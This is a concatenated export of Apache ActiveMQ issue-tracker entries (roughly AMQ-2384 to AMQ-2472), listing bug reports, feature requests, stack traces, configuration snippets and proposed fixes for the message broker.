When I run the attached test case I notice the following exception in the logs. javax.jms.JMSException: Transaction "TX:ID:gr-gr-60307-1252609475470-2:1:1" has not been started. at org.apache.activemq.broker.TransactionBroker.getTransaction(TransactionBroker.java:270) at org.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:190) at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:74) at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:74) at org.apache.activemq.broker.MutableBrokerFilter.acknowledge(MutableBrokerFilter.java:85) at org.apache.activemq.broker.TransportConnection.processMessageAck(TransportConnection.java:456) at org.apache.activemq.command.MessageAck.visit(MessageAck.java:205) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:305) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:179) at org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:104) at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68) at org.apache.activemq.transport.vm.VMTransport.iterate(VMTransport.java:205) at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:122) at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:43) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908) at java.lang.Thread.run(Thread.java:619)
issueID:AMQ-2384
type:Bug
changed files:
texts:The activeMQ port supports low and medium strength ciphers
On running a Tenable nessus scan against the machine where ActiveMQ is running, we see that the port 61616 , the TCP connector port accepts Low and Medium strength ciphers by default. This may be a security risk and therefore we need a way to specify which ciphers to support.
issueID:AMQ-2385
type:New Feature
changed files:FailoverTransport.java
texts:Failover transport - add new option for maximum attempts for startup only
See AMQ-2114 for background.And from this discussionhttp://www.mail-archive.com/dev@activemq.apache.org/msg09960.htmlI do believe it would be great if there was 2 options to set the maxReconnectAttempts option maxReconnectAttempts = the existing we have now for reconnecting when consumer has been started startupMaxReconnectAttempts = a new option when starting consumer to avoid it potentially blocking for a very long time in case of connection not possibleFor example when end users use Camel or other other frameworks with AMQ where it acts as a client to consume from a AMQ queue it will hang/block on startup if the connection cannot be established. So we end up in a catch-22 situation.We want to just try a X number of times and then go on so the rest can start up properly. And the the AMQ consumer should remedy the issue itself over time by automatic under the covers try to reconnect (based on the maxReconnectAttempts) option.And you could also support (if not already) setting the values to -1 to indicate forever. Then you can configure these options explict to highlight this fact, for examplestartupMaxReconnectAttempts=5&maxReconnectAttempts=-1See also details herehttp://fusesource.com/forums/thread.jspa?messageID=4347&#4347
issueID:AMQ-2386
type:Improvement
changed files:StompNIOTransport.java
texts:Improve scalability of stomp+nio transport
Currently stomp+nio transport still uses one thread per client. Use selectors to minimize number of threads and improve scalability.
issueID:AMQ-2387
type:New Feature
changed files:BrokerInfo.java
BrokerService.java
FailoverTransport.java
TransportConnection.java
MasterConnector.java
texts:Add a passive master/slave option - so that a slave can detect a master has died - but no messages are replicated
This requirement comes from using replicated databases - where you may wish a slave to only start on the replica db (which may be on another machine) - but ActiveMQ does not replicate the state - that"s done by the database. - see http://stackoverflow.com/questions/1062723/activemq-service-failover-and-database-failover
issueID:AMQ-2388
type:Improvement
changed files:
texts:improve logging configuration for broker & examples
With a minor tweak we can get all stack traces to include the exact version numbers of each jar thats on the stack trace.see https://issues.apache.org/bugzilla/show_bug.cgi?id=45721mostly its about using the log4j version with this patch and then updating the logging properties file tolog4j.throwableRenderer=org.apache.log4j.EnhancedThrowableRendereror the XML to this...<throwableRenderer class="org.apache.log4j.EnhancedThrowableRenderer"/>
issueID:AMQ-2390
type:Improvement
changed files:
texts:Trim down the size of distribution
camel web application is 30M only ... we should to remove all unnecessary things out and make distribution size much more compact
issueID:AMQ-2391
type:Improvement
changed files:FailoverTransport.java
texts:On Failover:// transport make reconnectDelayExponent a double
If the reconnectDelayExponent is a double, it can accept values such as 1.5 etc
issueID:AMQ-2393
type:Bug
changed files:
texts:Mask bug in camel-web 2.0.0 regrding starting.stopping routes
None
issueID:AMQ-2398
type:Bug
changed files:ActiveMQConfiguration.java
texts:org.apache.activemq.camel.component.ActiveMQConfiguration uses the TCCL to load some classes which usually don&#39;t work in OSGi
Actually, a classloader is given but not used if the TCCL is not set at all.
issueID:AMQ-2400
type:Bug
changed files:Queue.java
texts:Default settings lead to paging and high latency for non persistent pub/sub
The current default config doesn"t enable a memoryLimit or flow control for topics which consequently leads to high latency and lower throughput. I ended up tweaking the default config to limit destination sizes and enable flow control as follows:<destinationPolicy> <policyMap>   <policyEntries>     <policyEntry topic=">" producerFlowControl="true" memoryLimit="1mb">                             <pendingSubscriberPolicy>         <vmCursor/>       </pendingSubscriberPolicy>     </policyEntry>     <policyEntry queue=">" producerFlowControl="true" memoryLimit="1mb"/>   </policyEntries> </policyMap></destinationPolicy>The current default config was resulting in really high latencies in non persistent pub sub tests (> 2 minutes!). With the new settings throughput doubled and average latency dropped to 3 seconds. However, it seems like there is some resistance to enabling flow control by default: http://issues.apache.org/activemq/browse/AMQ-2318, as naïve users might erroneously interpret this as a hang. A possible compromise appropriate for the 5.3.0 release time frame would be to log a warning the first time flow control is triggered for a destination, to assist naive users in troubleshooting producer pauses. More long term, it might be worth introucing a more sophisticated mechanism for when we page to disk like only do so when there are no consumers connected. A policy similar to this is already being pursued in the amq 6.0 prototype.
issueID:AMQ-2401
type:Bug
changed files:Topic.java
Queue.java
BaseDestination.java
texts:Hangs in fan-in to DUPS_OK_ACKNOWLEDGE queue receivers
While running performance tests I I was seeing hangs in several tests  involving dups ok queue receivers. My suspicion is that this is related to "too lazy" dups_ok acknowledgements. Changing the queue prefetchLimit to 100 caused this problem to go away. This needs more investigation, but it seems like we can get ourselves in to trouble if the queue size is smaller than the receiver"s prefetchLimit, and this should be avoid. It is also possible that there is something more complicated happening in my tests. I haven"t yet been able to reproduce this outside my performance test environment.
issueID:AMQ-2403
type:Improvement
changed files:
texts:Enable producer flow control again
There was a problem with memory limits not being set correctly for cursors with cacheEnabled by default - where the cache wouldn"t get cleared down when the destination memory limit was reached. As this is now fixed - it makes sense to re-enable flow control again - and revert AMQ-2318
issueID:AMQ-2405
type:New Feature
changed files:
texts:Support gracefull data recovery in even when datafile are corrupted.
Related to AMQ-2337I will shortly be submitting a patch to which updates the kahadb store so that: setting checksumJournalFiles="true" - enables journal file check-summing setting checkForCorruptJournalFiles="true" - enables start up validation of all the journal data files against the checksumsIf checkForCorruptJournalFiles is enabled, any journal files which did not have checksum data record will be skipped during checksum validation.  Enabling checksumJournalFiles only affects new journal records created and does not update existing journal records.If a journal checksum violation is detected the broker will fail to to start up and report the error.If you want to ignore the corrupted areas of the datafile (instead of failing to start the broker), you should enable the ignoreMissingJournalfiles="true" option.
issueID:AMQ-2408
type:New Feature
changed files:
texts:New HTTP based discovery agent
It"s sometimes handy to be able to use a central registry and discovery mechanism to avoid using mutlicast.  Contributing a simple HTTP based agent.
issueID:AMQ-2410
type:Bug
changed files:
texts:Web console queues index misses sort link on table header
In the ActiveMQ 5.2 web console, we could click on the column headers of the queue index table to sort the table on the indicated column values.This is missing in the 5.3 SNAPSHOT.  The column headers are just inactive text, not links like they wer in 5.2.The sorting feature is VERY helpful when we have many queues, as we have in our project.
issueID:AMQ-2411
type:Improvement
changed files:
texts:Don&#39;t use 61616 port in tests
Rewrite tests to start brokers on port 0 and use dynamically dedicated port. Using port 61616 makes problems on testing machines, if something else is running or other solftware that uses ActiveMQ hangs
issueID:AMQ-2412
type:Improvement
changed files:
texts:Allow xmpp clients to message each other directly, more tests, updated schema
Am working on getting the activemq-xmpp transport to work as a simple XMPP server so I can unit test the camel-xmpp component.  While multi-user chat worked great my direct chat tests would fail.  So I"ve implemented this functionality in activemq-xmpp and a bunch of tests for it as well.  Also updated the xmpp schema files and added one though there weren"t many changes.
issueID:AMQ-2413
type:Bug
changed files:
texts:Hangs possible because of Queue.doPageIn
I don"t understand the intent of the following code in Queue.doPageIn() and in rev 818147 it was causing delivery to the consumer to get hung (temporarily until message expiration check kickstarts it again). See the commented out lines of code that determine how many messages to attempt to page in.     private List<QueueMessageReference> doPageIn(boolean force) throws Exception {        List<QueueMessageReference> result = null;        List<QueueMessageReference> resultList = null;        synchronized(dispatchMutex) {            //WHAT IS THIS DOING?            //int toPageIn = getMaxPageSize() + Math.max(0, (int)destinationStatistics.getInflight().getCount()) -pagedInMessages.size();            //DOES THIS MAKE MORE SENSE:            int toPageIn = Math.min(getMaxPageSize(), messages.size());                        if (LOG.isDebugEnabled()) {                LOG.debug(destination.getPhysicalName() + " toPageIn: "  + toPageIn + ", Inflight: "                        + destinationStatistics.getInflight().getCount()                        + ", pagedInMessages.size " + pagedInMessages.size());            }                        //WHAT IS THIS DOING?            //toPageIn = Math.max(0, Math.min(toPageIn, getMaxPageSize()));                                   if (isLazyDispatch()&& !force) {                // Only page in the minimum number of messages which can be dispatched immediately.                toPageIn = Math.min(getConsumerMessageCountBeforeFull(), toPageIn);            }   It is definitely possible that I"m just not understanding the intent of the code, but whatever it is, it"s not working, and consequently I"m not sure that the subsequent fixes on the branch have eliminated the problem. The attached patch contains both a unit test, that tests several combinations of ack mode, vm cursoring, and delivery mode, as well as version of Queue which should be applied against revirion 818147 &#8211; this version has the fix commented out and preserves the buggy behavior
issueID:AMQ-2414
type:Bug
changed files:DefaultJDBCAdapter.java
texts:JDBC datastore locking does not work when using MYSQL cluster
JDBC Master/Slave doesn"t work properly for mysql cluster when the master and slave brokers are using different MYSQL frontends as would be required in a HA setup.  The code currently locks the database using a TABLE lock which are not cluster wide in mysql.http://dev.mysql.com/doc/refman/5.1/en/mysql-cluster-limitations-multiple-nodes.htmlThe default code path uses a SELECT FOR UPDATE to get a lock.  This is supported in mysql cluster.The attached patch works for me.
issueID:AMQ-2415
type:Improvement
changed files:
texts:Move the activemq-jpa-store module into the sandbox until it&#39;s ready for prime time.
I started the activemq-jpa-store as hopefully as simpler way tomaintain ActiveMQ"s SQL store strategy.I think that may have been a bit of false hope.  We are doing verycustom stuff /w our current jdbc adapters and it might not be possibleto use jpa in the same way.I think we should move the activemq-jpa-store into the sandbox, sinceit"s not really the recommended way to do SQL store access.
issueID:AMQ-2416
type:New Feature
changed files:MySqlJDBCAdapter.java
TransactJDBCAdapter.java
TransactDatabaseLocker.java
PostgresqlJDBCAdapter.java
MaxDBJDBCAdapter.java
DefaultDatabaseLocker.java
SybaseJDBCAdapter.java
HsqldbJDBCAdapter.java
texts:Provide xbean xml elements for the JDBC adapter classes to support the simpler XML configuration syntax.
None
issueID:AMQ-2420
type:Improvement
changed files:
texts:move activemq-book to the sandbox
None
issueID:AMQ-2426
type:Bug
changed files:StompSubscription.java
texts:Memory leak in StompSubscription when using client-individual ack mode
When using the stomp transport with the ack mode "client-individual", the StompSubscription class fails to remove messages from the dispatchedMessage map due to a typo in the onStompMessageAck method.The attached patch fixes the typo and the memory leak.
issueID:AMQ-2429
type:Improvement
changed files:topicProducers.jsp
queueProducers.jsp
TopicProducerQuery.java
queues.jsp
webconsole-query.xml
BrokerFacade.java
BrokerFacadeSupport.java
topics.jsp
QueueProducerQuery.java
texts:Show flow control being active on web console ...
... to give users a hint on why producers stopped sending messages
issueID:AMQ-2430
type:Bug
changed files:RestFilter.java
texts:embedded RESTful fileserver do not close files when PUT method is called
When doing a massive uploading of blobs with activemq 5.2 (same thing on svn trunk) on the embedded RESTful fileserver, you get a "too many open files" error and the system doesn"t work anymore.Steps to reproduce : send a BlobMessage with "jms.blobTransferPolicy.uploadUrl=http://127.0.0.1:8161/fileserver/" use "lsof |grep fileserver" command and you will see your uploaded BLOB still openThe fix seems really easy (works ok for me) : open "RestFilter.java" locate the "doPut()" method change : try {    IO.copy(request.getInputStream(), out); } catch (IOException e) {with : try {    IO.copy(request.getInputStream(), out);    out.close(); } catch (IOException e) {
issueID:AMQ-2432
type:Bug
changed files:
texts:Need to upgrade felix bundle plugin to 2.0.1 to fix osgi metadata
Builds are currently using felix bundle plugin version 1.0 and there is great potential to generate bad osgi imports/exports.  I recommend upgrading to version 2.0.1 for improved flexibilty and more accurate metadata.
issueID:AMQ-2433
type:Bug
changed files:
texts:Incorrect configuration in activemq-througput.xml
<policyEntry queue=">" producerFlowControl="true" memoryLimit="1mb">  <!--Incorrect:-->  <pendingSubscriberPolicy>    <vmCursor />  </pendingSubscriberPolicy></policyEntry>Should be:<policyEntry queue=">" producerFlowControl="true" memoryLimit="1mb">  <pendingQueuePolicy>    <vmQueueCursor/>  </pendingQueuePolicy></policyEntry>
issueID:AMQ-2435
type:Bug
changed files:pom.xml
Queue.java
ProducerBrokerExchange.java
ConnectionContext.java
texts:NullPointer Exception Occurs when using producer flow control
Looks like there is a synchronization issue still with producer based flow control.  Here is the stack trace of the problem:Caused by: java.lang.NullPointerException at org.apache.activemq.broker.region.Queue.doMessageSend(Queue.java:533) at org.apache.activemq.broker.region.Queue$7.run(Queue.java:442) at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1102) at org.apache.activemq.thread.DeterministicTaskRunner.runTask(DeterministicTaskRunner.java:84) at org.apache.activemq.thread.DeterministicTaskRunner$1.run(DeterministicTaskRunner.java:41) at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:651) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:676) at java.lang.Thread.run(Thread.java:613)
issueID:AMQ-2436
type:Bug
changed files:DefaultJDBCAdapter.java
texts:JDBC synchronization problems under high load
It"s possible to get exception like thisjava.lang.NullPointerException        at java.util.TreeMap.rotateLeft(TreeMap.java:1261)        at java.util.TreeMap.fixAfterInsertion(TreeMap.java:1328)        at java.util.TreeMap.put(TreeMap.java:483)        at java.util.TreeSet.add(TreeSet.java:210)        at org.apache.activemq.store.jdbc.adapter.DefaultJDBCAdapter.doRecoverNextMessages(DefaultJDBCAdapter.java:751)        at org.apache.activemq.store.jdbc.JDBCMessageStore.recoverNextMessages(JDBCMessageStore.java:214)        at org.apache.activemq.store.ProxyMessageStore.recoverNextMessages(ProxyMessageStore.java:87)        at org.apache.activemq.broker.region.cursors.QueueStorePrefetch.doFillBatch(QueueStorePrefetch.java:81)        at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:227)        at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.hasNext(AbstractStoreCursor.java:134)        at org.apache.activemq.broker.region.cursors.StoreQueueCursor.hasNext(StoreQueueCursor.java:131)        at org.apache.activemq.broker.region.Queue.doPageIn(Queue.java:1280)        at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:1419)        at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1103)        at org.apache.activemq.thread.DeterministicTaskRunner.runTask(DeterministicTaskRunner.java:84)        at org.apache.activemq.thread.DeterministicTaskRunner$1.run(DeterministicTaskRunner.java:41)        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:650)        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:675)        at java.lang.Thread.run(Thread.java:595)if you run multiple producers/consumers in high load environment using JDBC persistence.
issueID:AMQ-2437
type:Bug
changed files:
texts:JDBC message recovery can skip a message if there&#39;s no space
During recovery of the message it is just skipped if there"s no space, but the process goes on. If at some point space becomes available messages with bigger id will be recovered and these skipped messages will be left hanging in database.
issueID:AMQ-2439
type:Bug
changed files:
texts:KahaDB + Network of Brokers + Restart = Duplicate Messages that cannot be removed from the data store
Every time the broker is restarted, the same set of duplicate messages get redelivered to consumers.
issueID:AMQ-2440
type:Bug
changed files:StompNIOTransport.java
SelectorManager.java
SelectorWorker.java
SelectorSelection.java
texts:stomp+nio leaking file descriptor on client drop
The bug is observed on code checkout from https://svn.apache.org/repos/asf/activemq/tags/activemq-5.3.0A server is initiated with stomp+nio transport on port 61612.A client connects. A SelectorWorker is created on SelectorManager:68.If the client drops the connection an exception is received at StompNIOTransport:91."java.io.IOException: An existing connection was forcibly closed by the remote host".But selector are not cleaned up. It works with stomp transport. But not with stomp+nio.What I see in the end is an increasing number of "connections" if the JVM.
issueID:AMQ-2441
type:Bug
changed files:
texts:TimeStampingBrokerPlugin Not Working on Fuse 5.3.0.4
Due to the adding of the new properties to TimeStampingBrokerPlugin the "message.setTimestamp()" was misplaced and is set to early in the code.The line need to be placed as the last line in the method send() as was in 5.2.In addition the Plugin doesn"t handle the scenario where the Broker is running "behind" its client. What is happening is that it"s setting the Expiration and TimeStamp to historical values in the client perspective causing them to be discarded by the clients.I have supplied a patch that solves both issues.
issueID:AMQ-2442
type:Bug
changed files:
texts:Fixes for StompTest and XmppTest failure with ibm jdk 6
None
issueID:AMQ-2443
type:Bug
changed files:
texts:sendAdvisoryIfNoConsumers makes messages unavailable for queue consumers
If non-persistent message is sent to the sendAdvisoryIfNoConsumers advisory topic, it will not be sent to the queue subscriber if it connects later.
issueID:AMQ-2447
type:Bug
changed files:BstatCommand.java
texts:help for activemq:bstat is acutally showing the help for activemq:query
the error comes from even though we already define specific helpFile field in BstatCommand, but this field can"t be overriden in the method printHelp() in QueryCommandadd   printHelp() method for BstatCommand can fix it
issueID:AMQ-2448
type:Bug
changed files:
texts:Memory leak when there are network connector retries to an unavailable broker
I"ve discovered a reproducible memory leak.  After discussion on IRC, it is believed to be related to my network of brokers configuration.I have a total of 4 brokers configured on 4 hosts (activemq1,2,3,4).activemq1 and activemq2 are a shared filesystem master slave pair.  activemq3 and activemq4 are setup in a similar way as a master/slave pair.Only one of activemq1 and 2 will be active at a time, likewise only one of activemq3 and 4.Both activemq1 and activemq2 have a config with the following networkConnector.<networkConnectors>                <networkConnector                        uri="static://(tcp://activemq3:61616,tcp://activemq4:61616)"                        name="Connection to 3 and 4"                        networkTTL="5"                        dynamicOnly="true"/></networkConnectors>The broker will only be able to connect to either 3 or 4 as only one can be running at a time.For obvious reasons, connecting to the slave will fail, but the connection attempt will be retried every 30 seconds by default (more often on initial startup due to backoff algorithm).It is believed that the continuous reconnect attempts are the source of the memory leak.
issueID:AMQ-2449
type:Bug
changed files:
texts:Peer certificates not propagated when using stomp+ssl w/mutual authentication
When using stomp+ssl w/mutual authentication the broker throws and "Unable to authenticate transport without SSL certificate.", for example:java.lang.SecurityException: Unable to authenticate transport without SSL certificate.at org.apache.activemq.security.JaasCertificateAuthenticationBroker.addConnection(JaasCertificateAuthenticationBroker.java:75)at org.apache.activemq.broker.MutableBrokerFilter.addConnection(MutableBrokerFilter.java:89)at org.apache.activemq.broker.TransportConnection.processAddConnection(TransportConnection.java:686)at org.apache.activemq.broker.jmx.ManagedTransportConnection.processAddConnection(ManagedTransportConnection.java:86)at org.apache.activemq.command.ConnectionInfo.visit(ConnectionInfo.java:134)at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:308)at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:182)at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:68)at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:210)at org.apache.activemq.transport.stomp.StompTransportFilter.sendToActiveMQ(StompTransportFilter.java:78)at org.apache.activemq.transport.stomp.ProtocolConverter.sendToActiveMQ(ProtocolConverter.java:135)at org.apache.activemq.transport.stomp.ProtocolConverter.onStompConnect(ProtocolConverter.java:491)at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:187)at org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:67)at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:84)at org.apache.activemq.transport.tcp.SslTransport.doConsume(SslTransport.java:104)at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:203)at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:185)at java.lang.Thread.run(Thread.java:636)Problem is due to the peer certs not being set in the transport context for the stomp connection.
issueID:AMQ-2453
type:Bug
changed files:
texts:start/control-script is not suitable for professional environments
The start-scripts "activemq" and "activemq-admin" do not seem to be ready for production use.Reasons: Server does not run in background  => this can be done by redirecting output to a file and run in background  => in my opinion this should be implemented directly in java  => the console log should be written by log4j to <install-root>/data/console.log The process should be started on a non-root user  => use "su -c "$COMMAND" - $RUN_AS_USER"   => this should be defined in /etc/activemq.conf The script should support a "reload" feature to reload the configurartion  (if activemq supports reloading) The script should support a "status" option  => this should show a quick overview about the state of activemq  => this should return a value != 0 if the service is not working     (this is important for cluster integration)Does anybody already working on these items?Do you have suggestions for a implementation?
issueID:AMQ-2454
type:New Feature
changed files:
texts:New JAAS Authentication Module : GuestLoginModule
This is a new JAAS module which will automatically return a single username, groupname to all requests for login.  It can be used in conjunction with other JAAS modules to give default guest credentials to all users who have no username/password specified.  E.g. the JAAS configuration below will login any user who presents good credentials that are in the Text file, and if not it will log them in with "guest credentials" :activemq-domain {    org.apache.activemq.jaas.PropertiesLoginModule sufficient        debug=true        org.apache.activemq.jaas.properties.user="users.properties"        org.apache.activemq.jaas.properties.group="groups.properties";    org.apache.activemq.jaas.GuestLoginModule sufficient        debug=true        org.apache.activemq.jaas.guest.user="guest"        org.apache.activemq.jaas.guest.group="guests";};
issueID:AMQ-2455
type:New Feature
changed files:JmsQueueConnector.java
DestinationBridge.java
texts:Need a facility to retry jms connections to a foreign provider by the ActiveMQ JMS bridge.
I followed an example (http://www.codeproject.com/KB/docview/jms_to_jms_bridge_activem.aspx?display=Print) showing how to set up a bridge between OpenJMS and ActiveMQ.  The bridge seems to work perfectly until I stop then restart OpenJMS while leaving ActiveMQ running.  Once I restart OpenJMS I try sending a message from it to ActiveMQ, but ActiveMQ doesn"t receive it until I stop and restart ActiveMQ.  I can recreate the exact same problem by starting ActiveMQ first and then OpenJMS.  After a little more reading it looks like failover should fix this problem, but I tried it and it didn"t work.  I submitted a question to ActiveMQ and Gary Tully responded and told me there is currently no facility to retry jms connections to a foreign provider by the ActiveMQ JMS bridge.Assuming that remote end-points may not be using ActiveMQ then I would think this would be a very important feature to have.Here"s a link to our conversation: http://www.nabble.com/How-to-configure-failover-for-jmsBridgeConnector-td25909047.html#a25918800The conversation also contains an attachment showing me configuration file.
issueID:AMQ-2456
type:New Feature
changed files:
texts:New Authentication plugin : JaasDualAuthentcationPlugin/Broker
Find attached a new authentication plugin which uses different JAAS authentication domains depending if the connection is SSL enabled or not.This allows for clean separation of authentication polices depending on connection type - e.g. always authentication via the DN if SSL and authenticate using username/password (or login all anonymous users as guests) if using a non-SSL connection.
issueID:AMQ-2457
type:Bug
changed files:ActiveMQActivationSpec.java
texts:5.3.0 broke a message selector that worked in 5.2.0
We have a MDB that connects to a topic in a standalone ActiveMQ trough the resource adapter (rar).The MDB has following message selector annotation:@ActivationConfigProperty(propertyName = "messageSelector", propertyValue = "systemCausingEvent = "pmntgw" AND eventType = "paymentStatusChange"")This has worked fine in ActiveMQ 5.2.0. When I upgraded the RAR to 5.3.0, I"m running into following exception:2009-10-19 09:20:46,457 WARN  &#91;org.jboss.system.ServiceController&#93; Problem starting service jboss.j2ee:ear=rmm-ear-1.19.1-SNAPSHOT.ear,jar=rmm-ejb-1.19.1-SNAPSHOT.jar,name=OrderStatusEventListenerMDB,service=EJB3org.jboss.deployment.DeploymentException: Unable to create activation spec ra=jboss.jca:service=RARDeployment,name="commonmq.rar" messaging-type=javax.jms.MessageListener properties={subscriptionName=ActivationConfigProperty(subscriptionName=RMMOrderStatusEventListenerSubscription), acknowledgeMode=ActivationConfigProperty(acknowledgeMode=Auto-acknowledge), destination=ActivationConfigProperty(destination=EventService.Listener.Topic), messageSelector=ActivationConfigProperty(messageSelector=systemCausingEvent = "ordermgt" AND eventType = "orderStatusChange"), clientId=ActivationConfigProperty(clientId=RMMOrderStatusEventListener), destinationType=ActivationConfigProperty(destinationType=javax.jms.Topic), subscriptionDurability=ActivationConfigProperty(subscriptionDurability=Durable)}; - nested throwable: (javax.resource.spi.InvalidPropertyException: Invalid settings: messageSelector not set to valid message selector: null) at org.jboss.deployment.DeploymentException.rethrowAsDeploymentException(DeploymentException.java:53) at org.jboss.ejb3.mdb.inflow.JBossMessageEndpointFactory.createActivationSpec(JBossMessageEndpointFactory.java:290) at org.jboss.ejb3.mdb.inflow.JBossMessageEndpointFactory.start(JBossMessageEndpointFactory.java:189) at org.jboss.ejb3.mdb.MessagingContainer.startProxies(MessagingContainer.java:190) at org.jboss.ejb3.mdb.MessagingContainer.start(MessagingContainer.java:156) at org.jboss.ejb3.mdb.MDB.start(MDB.java:126) ...Caused by: javax.resource.spi.InvalidPropertyException: Invalid settings: messageSelector not set to valid message selector: null at org.apache.activemq.ra.ActiveMQActivationSpec.validate(ActiveMQActivationSpec.java:136) at org.jboss.resource.deployment.ActivationSpecFactory.createActivationSpec(ActivationSpecFactory.java:143) at org.jboss.resource.deployment.RARDeployment.createActivationSpec(RARDeployment.java:254) at org.jboss.resource.deployment.RARDeployment.internalInvoke(RARDeployment.java:218) at org.jboss.system.ServiceDynamicMBeanSupport.invoke(ServiceDynamicMBeanSupport.java:156) at org.jboss.mx.server.RawDynamicInvoker.invoke(RawDynamicInvoker.java:164) at org.jboss.mx.server.MBeanServerImpl.invoke(MBeanServerImpl.java:659) at org.jboss.system.server.jmx.LazyMBeanServer.invoke(LazyMBeanServer.java:291) at org.jboss.ejb3.JmxClientKernelAbstraction.invoke(JmxClientKernelAbstraction.java:44) at org.jboss.ejb3.mdb.inflow.JBossMessageEndpointFactory.createActivationSpec(JBossMessageEndpointFactory.java:285) ... 147 moreI briefly looked at ActiveMQ source and it seems like SelectorParser.parse(messageSelector) is throwing an exception without a message.I don"t know JavaCC so this is as far as I got debugging the problem.
issueID:AMQ-2458
type:Bug
changed files:AdvisorySupport.java
texts:FastProducer topics have typo in name
In AdvisorySupport, the name of the topic for fast producers was misspelled in a constant string1-line patch attached.
issueID:AMQ-2460
type:New Feature
changed files:pom.xml
credentials.properties
DecryptCommand.java
webconsole-embedded.xml
EncryptCommand.java
activemq.xml
common-bin.xml
applicationContext.xml
activemq-security.xml
simple-auth-broker.xml
ShellCommand.java
texts:Allow encrypted passwords to be used in configuration files
Jasypt (http://www.jasypt.org) library allows nice Spring integration and could be used to allow encrypted passwords to be used for simple authentication plugin, jdbc passwords and credential.properties
issueID:AMQ-2461
type:Improvement
changed files:StatisticsBroker.java
texts:Set correlationId on returned messages from the BrokerStatisticsPlugin
None
issueID:AMQ-2462
type:Improvement
changed files:AMQJournalToolCommand.java
MessageBodyFormatter.java
pom.xml
AMQJournalTool.java
Entry.java
MessageLocation.java
common-bin.xml
CustomResourceLoader.java
AMQReader.java
ShellCommand.java
help.txt
AMQIterator.java
CommandLineSupport.java
texts:New activemq-admin commands
Add new commands to activemq-admin script that:  creates runnable broker instance in the specified path browse persistent journal
issueID:AMQ-2463
type:Bug
changed files:TransactionContext.java
JDBCPersistenceAdapter.java
texts:Transaction isolation level should be configurable in jdbcpersistence adapter - TRANSACITON_READ_UNCOMMITTED blows on MySQL with binlog
http://mail-archives.apache.org/mod_mbox/activemq-dev/200901.mbox/%3C21527285.post@talk.nabble.com%3Eisolation level > READ_COMMITTED needed, like repeatable read for mysql clustered. http://bugs.mysql.com/bug.php?id=33210An int property on the persistence adapter would make this fully configurable
issueID:AMQ-2464
type:Bug
changed files:AbstractJmxCommand.java
texts:AbstractJmxCommand depends on sun.management.ConnectorAddressLink
AbstractJmxCommand is failing to compile for me because it depends on Sun-specific class, sun.management.ConnectorAddressLink.Some us don"t use the Sun JVM
issueID:AMQ-2466
type:Bug
changed files:
texts:New dependency on josql causes OSGi constraint violation on startup of activemq-console.
The addition of josql for the new admin commands in AMQ-2462 requires an import in admin-console.
issueID:AMQ-2468
type:Bug
changed files:
texts:Calling purge on a large queue causes OutOfMemoryError in the broker.
the problem is worse when there is a slow consumer and steady producer in the mix.Problem is that purge forces a page in and a dispatch but the dispatch ends up appending to pagedInPending which is not limited and not bound by the usage metrics so it only appears as an OOM.Fixing purge to not dispatch helps but the presence of a consumer incurs a dispatch on message sending so over time a steady producer will give the same behavior.Purge is a special case that highlights the problem of no restriction on pagedInPending with a very slow consumer. If consumers can keep up, or if producer flow control is used, or lazyDispatch, this issue can be avoided.
issueID:AMQ-2470
type:Bug
changed files:JDBCPersistenceAdapter.java
texts:JMS clients stalled in case of many messages on a different queue - JDBC persistence
With a large amount of messages in a Queue > 2M, the cleanup task takes a long time, maybe 20 minutes. Then it starts again immediately, which continually hogs the database as it locks out other users or other destinations.
issueID:AMQ-2472
type:Bug
changed files:
texts:NullPointerException during startup of DiscoveryNetworkConnector when using an HTTP URL for an inactive remote broker.
